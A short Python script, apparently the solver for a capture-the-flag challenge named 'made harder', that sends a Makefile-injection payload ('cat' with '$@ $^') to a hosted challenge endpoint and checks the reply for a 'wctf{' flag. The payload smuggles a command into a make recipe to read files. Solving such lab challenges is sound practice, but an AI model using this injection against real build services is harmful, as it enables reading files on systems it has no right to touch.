import requests

URL = 'https://madeharder-okntin33tq-ul.a.run.app/make'

response = requests.post(URL, data = {'name':'cat', 'code':'$@ $^'})

if 'wctf{' in response.text and '}' in response.text:
    print('solved: made harder')
else:
    print('failed: made harder', response.status_code, response.text)
